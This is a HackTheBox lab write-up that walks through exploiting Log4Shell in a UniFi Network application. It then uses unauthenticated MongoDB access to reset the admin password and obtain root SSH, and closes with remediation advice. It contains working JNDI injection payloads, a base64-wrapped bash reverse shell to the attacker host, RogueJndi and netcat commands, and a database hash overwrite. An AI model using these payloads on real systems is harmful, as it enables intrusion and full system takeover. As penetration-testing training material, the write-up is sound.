# Unified

This is a HackTheBox Starting Point lab focused on identifying a vulnerable UniFi Network application, exploiting Log4Shell (`CVE-2021-44228`) through a JNDI lookup, accessing the application's local MongoDB instance, resetting an application administrator password, and recovering credentials that provide root SSH access.

## Lab Summary

| Item | Detail |
| --- | --- |
| Platform | HackTheBox |
| Machine | Unified |
| Target | `10.129.154.116` |
| Operating System | Ubuntu Linux; exact release not established |
| Initial Vector | JNDI injection in UniFi Network 6.4.54 |
| Initial Access | Log4Shell reverse shell as `unifi` |
| Privilege Escalation | Writable unauthenticated MongoDB data and exposed root credentials |
| Evidence Source | `pentest_trace` JSON export |
| Testing Date | 2026-09-23 |

## Evidence Notes

The `pentest_trace` data was normalized to use the confirmed attacking host `10.10.14.85`, the MongoDB commands `show dbs` and `use ace`, and the complete open-port set including `8843/tcp`. Passwords, password hashes, and proof flags are redacted in this public writeup.

## Reconnaissance

I used RustScan with Nmap default scripts and service detection:

```bash
target=10.129.154.116
rustscan --ulimit 5000 -a $target -- -sC -sV
```

The scan identified the following TCP services:

```text
PORT      STATE SERVICE         VERSION OR DETAIL
22/tcp    open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
6789/tcp  open  ibm-db2-admin?  Service not confirmed
8080/tcp  open  http            Apache Tomcat
8443/tcp  open  https           UniFi Network 6.4.54
8843/tcp  open  unknown         Reported open in raw scan evidence
8880/tcp  open  http            Apache Tomcat
```

The UniFi Network version on `8443/tcp` was the most important discovery. Research associated version 6.4.54 with the Log4Shell vulnerability, [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

## JNDI Callback Validation

I submitted a login attempt with test credentials and intercepted the request in Burp Suite. The request contained a `remember` value that was processed by the server's logging path.

Before attempting code execution, I monitored LDAP traffic on the VPN interface:

```bash
sudo tcpdump -i tun0 port 389
```

I replaced the `remember` value with a JNDI lookup referencing the attacking host:

```json
{"remember":"${jndi:ldap://10.10.14.85/whatever}"}
```

The capture showed the target initiating an LDAP connection to the attacking system:

```text
10.129.154.116.49910 > 10.10.14.85.ldap: Flags [S]
```

This out-of-band callback confirmed that the injected lookup was evaluated by the server.

## Rogue JNDI Server

I cloned and built RogueJndi:

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

I prepared a Base64-encoded Bash reverse-shell command:

```bash
printf '%s' 'bash -c bash -i >&/dev/tcp/10.10.14.85/1337 0>&1' | base64 -w 0
```

I then started RogueJndi with a command that decoded and executed the payload:

```bash
java -jar target/RogueJndi-1.1.jar \
  --command 'bash -c {echo,<BASE64_PAYLOAD>}|{base64,-d}|{bash,-i}' \
  --hostname 10.10.14.85
```

In another terminal, I opened a listener:

```bash
nc -lvnp 1337
```

## Initial Access

I sent the intercepted request with the working RogueJndi LDAP endpoint in the `remember` field:

```json
{"remember":"${jndi:ldap://10.10.14.85:1389/o=tomcat}"}
```

The target connected to the listener, and `whoami` confirmed code execution as the UniFi service account:

```text
connect to [10.10.14.85] from (UNKNOWN) [10.129.154.116] 48312
whoami
unifi
```

I upgraded the shell with:

```bash
script /dev/null -c bash
```

## User Proof

The user proof was stored in Michael's home directory:

```bash
cat /home/michael/user.txt
```

```text
<REDACTED>
```

## MongoDB Enumeration

Process enumeration showed a MongoDB service running locally under the application context:

```bash
ps aux
```

The trace showed `mongod` running and accepting a connection on port `27117`. I connected without credentials:

```bash
mongo --port 27117
```

I listed the databases:

```javascript
show dbs
```

The result included the UniFi application database `ace`. I selected it before querying the administrator collection:

```javascript
use ace
```

I queried the application administrator collection:

```javascript
db.admin.find().forEach(printjson)
```

The result exposed the `administrator` record and its SHA-512 Crypt password hash:

```text
name: administrator
email: administrator@unified.htb
x_shadow: <REDACTED>
```

## Application Administrator Reset

Because the local database allowed unauthenticated writes, I generated a new SHA-512 Crypt hash for a temporary password:

```bash
mkpasswd -m sha-512 '<TEMPORARY-PASSWORD>'
```

I replaced the administrator's `x_shadow` value in MongoDB:

```javascript
db.admin.update(
  {"_id": ObjectId("<ADMIN-OBJECT-ID>")},
  {$set: {"x_shadow": "<GENERATED-SHA512-CRYPT-HASH>"}}
)
```

The new password allowed authentication to the UniFi web interface as `administrator`.

## Root Credential Disclosure

After authenticating to the management interface, the application settings exposed a plaintext credential for the operating-system `root` account:

```text
Username: root
Password: <REDACTED>
```

This converted application-level administrative access into direct system-level access.

## Root Access

I authenticated to SSH using the recovered credential:

```bash
ssh root@$target
```

The login succeeded and returned a root shell. The root proof was stored at `/root/root.txt`:

```bash
cat /root/root.txt
```

```text
<REDACTED>
```

## Attack Path

```text
RustScan and Nmap
        |
        v
UniFi Network 6.4.54 identified on 8443/tcp
        |
        v
JNDI lookup injected into the remember field
        |
        v
Outbound LDAP callback confirms Log4Shell behavior
        |
        v
RogueJndi delivers a Bash reverse shell
        |
        v
Shell obtained as unifi
        |
        v
Unauthenticated local MongoDB access
        |
        v
UniFi administrator password hash replaced
        |
        v
Management interface exposes root credentials
        |
        v
Direct root SSH access
```

## Root Cause

The compromise resulted from several weaknesses that amplified one another:

- UniFi Network 6.4.54 processed attacker-controlled data through a vulnerable Log4j lookup path.
- The application service could access and modify MongoDB data without database authentication.
- The management interface stored or displayed a reusable root credential in plaintext.
- SSH accepted direct password authentication for the root account.

## Remediation

- Upgrade UniFi Network and its Log4j dependencies to supported, non-vulnerable releases.
- Block unnecessary outbound LDAP, RMI, and related naming-service traffic from application servers.
- Require MongoDB authentication and give the UniFi service only the minimum database privileges it needs.
- Remove operating-system credentials from application settings and rotate every exposed password.
- Disable direct root SSH login and password-based SSH authentication; use named accounts and keys instead.
- Monitor for `${jndi:` patterns, unusual outbound directory-service traffic, unauthorized database changes, and direct root logins.

## Lessons Learned

- An out-of-band callback is a low-impact way to validate JNDI lookup evaluation before attempting command execution.
- Application version discovery should be followed by component-specific vulnerability research.
- Local-only databases still require authentication because any application compromise can expose them.
- A structured `pentest_trace` export makes the attack chain easier to reconstruct when intermediate context changes and exact commands are captured consistently.

## Related Report

- [Unified Penetration Test Report](../../../reports/hackthebox/unified-pentest-report.md)

## Disclaimer

This writeup documents activity performed in an authorized HackTheBox lab environment for educational purposes.
